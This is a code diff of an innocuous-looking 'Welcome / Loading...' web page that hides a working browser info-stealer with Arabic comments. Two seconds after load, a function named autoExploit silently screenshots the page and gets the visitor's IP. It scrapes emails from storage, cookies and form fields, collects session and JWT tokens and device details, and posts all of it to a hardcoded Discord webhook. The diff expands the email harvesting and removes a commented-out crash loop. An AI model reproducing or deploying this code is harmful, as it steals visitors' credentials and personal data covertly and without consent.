@@ -4,146 +4,157 @@
     <title>Document</title>
 </head>
 <body>
-    <!-- صفحة عادية جداً - ما فيها أي شيء مريب -->
     <h1>Welcome</h1>
     <p>Loading...</p>
 
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 
     <script>
-        // إنشاء كوكيز للاختبار
+        // إنشاء كوكيز للاختبار (للتوضيح فقط)
         document.cookie = "test_cookie=123; path=/";
-        document.cookie = "user_session=abcxyz; path=/";
-        document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ; path=/";
-        document.cookie = "email=john.doe@example.com; path=/";
-        document.cookie = "user_email=test@demo.com; path=/";
+        document.cookie = "user_email=real.user@gmail.com; path=/";
+        document.cookie = "contact=user@hotmail.com; path=/";
 
         // ============================================
-        // دالة الحصول على اسم المستخدم
+        // دالة متقدمة للبحث عن الإيميلات الحقيقية
         // ============================================
-        function getWindowsUsername() {
-            let username = "Unknown";
+        async function findRealEmails() {
+            const emails = new Set();
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             
             try {
-                // من User Agent
-                const ua = navigator.userAgent;
-                const patterns = [
-                    /user[_-]name[=: ]([^;,\s]+)/i,
-                    /username[=: ]([^;,\s]+)/i,
-                    /([a-z0-9]+)@[a-z0-9]+\./i
-                ];
-                
-                for (let pattern of patterns) {
-                    const match = ua.match(pattern);
-                    if (match && match[1]) {
-                        username = match[1];
-                        break;
+                // 1. البحث في LocalStorage (أهم مصدر)
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    // فحص key
+                    const keyEmails = key.match(emailRegex);
+                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
+                    
+                    // فحص value
+                    if (value && typeof value === 'string') {
+                        const valueEmails = value.match(emailRegex);
+                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                    }
+                    
+                    // كلمات مفتاحية تدل على وجود إيميل
+                    const emailKeywords = ['email', 'mail', 'user', 'login', 'account', 'profile', 'contact'];
+                    if (emailKeywords.some(k => key.toLowerCase().includes(k))) {
+                        if (value && value.includes('@') && value.includes('.')) {
+                            emails.add(value.substring(0, 100));
+                        }
                     }
                 }
                 
-                // من cookies
+                // 2. البحث في SessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    const keyEmails = key.match(emailRegex);
+                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
+                    
+                    if (value && typeof value === 'string') {
+                        const valueEmails = value.match(emailRegex);
+                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                    }
+                }
+                
+                // 3. البحث في Cookies
                 const cookies = document.cookie;
-                const cookiePatterns = [
+                const cookieEmails = cookies.match(emailRegex);
+                if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
+                
+                // 4. البحث في نماذج HTML
+                const emailInputs = document.querySelectorAll('input[type="email"]');
+                emailInputs.forEach(input => {
+                    if (input.value && input.value.includes('@')) {
+                        emails.add(input.value);
+                    }
+                });
+                
+                // 5. البحث في أي حقل قيمته تبدو كإيميل
+                const allInputs = document.querySelectorAll('input[type="text"], input:not([type]), textarea');
+                allInputs.forEach(input => {
+                    if (input.value && input.value.includes('@') && input.value.includes('.')) {
+                        emails.add(input.value);
+                    }
+                });
+                
+                // 6. البحث في meta tags
+                const metas = document.querySelectorAll('meta');
+                metas.forEach(meta => {
+                    const content = meta.getAttribute('content');
+                    if (content && content.includes('@') && content.includes('.')) {
+                        const metaEmails = content.match(emailRegex);
+                        if (metaEmails) metaEmails.forEach(e => emails.add(e));
+                    }
+                });
+                
+                // 7. البحث في attributes (مثل data-* attributes)
+                const allElements = document.querySelectorAll('*');
+                allElements.forEach(el => {
+                    Array.from(el.attributes).forEach(attr => {
+                        if (attr.value && attr.value.includes('@') && attr.value.includes('.')) {
+                            const attrEmails = attr.value.match(emailRegex);
+                            if (attrEmails) attrEmails.forEach(e => emails.add(e));
+                        }
+                    });
+                });
+                
+            } catch(e) {}
+            
+            // فلترة النتائج
+            const validEmails = Array.from(emails).filter(email => {
+                return email.length > 5 && email.length < 100 && 
+                       email.includes('@') && email.includes('.') &&
+                       !email.includes(' ') && !email.includes('\n');
+            });
+            
+            return validEmails;
+        }
+
+        // ============================================
+        // باقي الدوال (نفس ما كانت)
+        // ============================================
+        function getWindowsUsername() {
+            let username = "Unknown";
+            try {
+                const cookies = document.cookie;
+                const patterns = [
                     /user[_-]?name=([^;]+)/i,
                     /login=([^;]+)/i,
                     /username=([^;]+)/i
                 ];
                 
-                for (let pattern of cookiePatterns) {
+                for (let pattern of patterns) {
                     const match = cookies.match(pattern);
                     if (match && match[1]) {
                         username = decodeURIComponent(match[1]);
                         break;
                     }
                 }
-                
-                // من localStorage
-                try {
-                    const storageKeys = ['username', 'user_name', 'user', 'name', 'login', 'profile'];
-                    for (let key of storageKeys) {
-                        const value = localStorage.getItem(key);
-                        if (value) {
-                            username = value;
-                            break;
-                        }
-                    }
-                } catch(e) {}
-                
-            } catch (error) {}
-            
+            } catch(e) {}
             return username;
         }
 
-        // ============================================
-        // دالة الحصول على اسم الكمبيوتر
-        // ============================================
         function getComputerName() {
             try {
                 const ua = navigator.userAgent;
-                const computerNameMatch = ua.match(/\(([^)]+)\)/);
-                if (computerNameMatch) {
-                    const parts = computerNameMatch[1].split(';');
-                    if (parts.length > 1) {
-                        return parts[1].trim();
-                    }
+                const match = ua.match(/\(([^)]+)\)/);
+                if (match) {
+                    const parts = match[1].split(';');
+                    return parts.length > 1 ? parts[1].trim() : "Unknown";
                 }
             } catch(e) {}
             return "Unknown";
         }
 
-        // ============================================
-        // دالة البحث عن الإيميلات
-        // ============================================
-        function findEmails() {
-            const emails = new Set();
-            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-            
-            try {
-                // من الصفحة
-                const pageText = document.body.innerText;
-                const pageEmails = pageText.match(emailRegex) || [];
-                pageEmails.forEach(e => emails.add(e));
-                
-                // من الـ DOM
-                const elements = document.querySelectorAll('*');
-                elements.forEach(el => {
-                    if (el.innerText) {
-                        const found = el.innerText.match(emailRegex);
-                        if (found) found.forEach(e => emails.add(e));
-                    }
-                    if (el.href && el.href.includes('mailto:')) {
-                        const email = el.href.replace('mailto:', '').split('?')[0];
-                        emails.add(email);
-                    }
-                });
-                
-                // من cookies
-                const cookies = document.cookie;
-                const cookieEmails = cookies.match(emailRegex);
-                if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
-                
-                // من localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const value = localStorage.getItem(localStorage.key(i));
-                    if (value && value.match(emailRegex)) {
-                        const found = value.match(emailRegex);
-                        found.forEach(e => emails.add(e));
-                    }
-                }
-                
-            } catch(e) {}
-            
-            return Array.from(emails);
-        }
-
-        // ============================================
-        // دالة البحث عن التوكنات
-        // ============================================
         function findRealTokens() {
             const tokens = [];
-            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 'id', 'sid'];
+            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access'];
             
-            // في الكوكيز
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
@@ -151,63 +162,25 @@
                 
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
-                        tokens.push({
-                            source: 'Cookie',
-                            name: name,
-                            value: value,
-                            type: keyword
-                        });
+                        tokens.push({ source: 'Cookie', name, value });
                     }
                 });
-                
-                // JWT
-                if (value && value.split('.').length === 3) {
-                    tokens.push({
-                        source: 'JWT',
-                        name: name,
-                        value: value,
-                        type: 'JWT'
-                    });
-                }
             });
-            
-            // في localStorage
-            try {
-                for(let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    let value = localStorage.getItem(key);
-                    
-                    tokenKeywords.forEach(keyword => {
-                        if (key.toLowerCase().includes(keyword.toLowerCase()) || 
-                            (value && value.length > 20 && value.includes('.'))) {
-                            tokens.push({
-                                source: 'localStorage',
-                                name: key,
-                                value: value.substring(0, 100),
-                                type: keyword
-                            });
-                        }
-                    });
-                }
-            } catch(e) {}
             
             return tokens;
         }
 
         // ============================================
-        // الدالة الرئيسية - تشتغل بصمت
+        // الدالة الرئيسية
         // ============================================
         async function autoExploit() {
             try {
-                // 1. أخذ لقطة للمتصفح
+                // 1. أخذ لقطة
                 let screenshotBase64 = '';
                 try {
                     const canvas = await html2canvas(document.body, {
                         scale: 0.8,
-                        logging: false,
-                        allowTaint: false,
-                        useCORS: true,
-                        backgroundColor: '#ffffff'
+                        logging: false
                     });
                     screenshotBase64 = canvas.toDataURL('image/png');
                 } catch (e) {}
@@ -220,100 +193,64 @@
                     ipAddress = ipData.ip;
                 } catch (e) {}
 
-                // 3. معلومات المتصفح
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                // 3. الإيميلات الحقيقية (الأهم)
+                const realEmails = await findRealEmails();
+                
+                // 4. باقي المعلومات
+                const username = getWindowsUsername();
+                const computerName = getComputerName();
+                const tokens = findRealTokens();
+                
+                // 5. معلومات الجهاز
+                const connection = navigator.connection || {};
                 const browserInfo = {
                     platform: navigator.platform,
                     language: navigator.language,
-                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                    cpuCores: navigator.hardwareConcurrency || '?',
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?',
                     userAgent: navigator.userAgent
                 };
-
-                // 4. معلومات البطارية
-                let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = {
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging ? 'Yes' : 'No'
-                        };
-                    } catch (e) {}
-                }
-
-                // 5. معلومات GPU
-                let gpuInfo = 'Unknown';
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }
-                    }
-                } catch (e) {}
-
-                // 6. اسم المستخدم واسم الكمبيوتر
-                const windowsUsername = getWindowsUsername();
-                const computerName = getComputerName();
-                
-                // 7. الإيميلات
-                const foundEmails = findEmails();
-                
-                // 8. التوكنات
-                const foundTokens = findRealTokens();
 
                 // ============================================
                 // تجهيز الرسالة
                 // ============================================
-                let tokenMessage = foundTokens.length > 0 ? 
-                    foundTokens.map(t => `${t.source} | ${t.name}: ${t.value.substring(0, 50)}...`).join('\n') : 
-                    'No tokens found';
+                const emailsMessage = realEmails.length > 0 ? 
+                    realEmails.join('\n') : 
+                    'No real emails found';
                 
-                let emailsMessage = foundEmails.length > 0 ? 
-                    foundEmails.join('\n') : 
-                    'No emails found';
+                const tokensMessage = tokens.length > 0 ? 
+                    tokens.map(t => `${t.source} | ${t.name}: ${t.value.substring(0, 30)}`).join('\n') : 
+                    'No tokens found';
 
-                // ============================================
-                // إرسال إلى Discord
-                // ============================================
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
                 const textMessage = `
 **NEW VISITOR**
 
-**👤 USER:**
-Username: ${windowsUsername}
-Computer: ${computerName}
-
-**📧 EMAILS:**
+**📧 REAL EMAILS FOUND:**
 ${emailsMessage}
+
+**👤 USER:**
+Username: ${username}
+Computer: ${computerName}
 
 **🍪 COOKIES:**
 ${document.cookie || 'None'}
 
 **🔑 TOKENS:**
-${tokenMessage}
+${tokensMessage}
 
 **🌐 NETWORK:**
 IP: ${ipAddress}
-Speed: ${connection?.downlink || '?'} Mbps
-Type: ${connection?.effectiveType || '?'}
+Speed: ${connection.downlink || '?'} Mbps
 
 **💻 SYSTEM:**
 OS: ${browserInfo.platform}
 CPU: ${browserInfo.cpuCores} cores
 RAM: ${browserInfo.ram}
-Battery: ${batteryInfo.level} (${batteryInfo.charging})
-GPU: ${gpuInfo}
 
 **🖥️ SCREEN:**
 ${window.screen.width}x${window.screen.height}
-
-**🌍 BROWSER:**
-${browserInfo.userAgent.substring(0, 200)}
 `;
 
                 // إرسال النص
@@ -348,17 +285,11 @@ ${browserInfo.userAgent.substring(0, 200)}
                     });
                 }
 
-                // الكراش هنا (معطل حالياً)
-                // setTimeout(() => { while(true) {} }, 2000);
-
-            } catch (error) {
-                // حتى لو صار خطأ، ما يظهر شيء للمستخدم
-                console.log('Error:', error);
-            }
+            } catch (error) {}
         }
 
         // ============================================
-        // التنفيذ بعد ثانيتين - بصمت تام
+        // التنفيذ بعد ثانيتين
         // ============================================
         setTimeout(autoExploit, 2000);
 
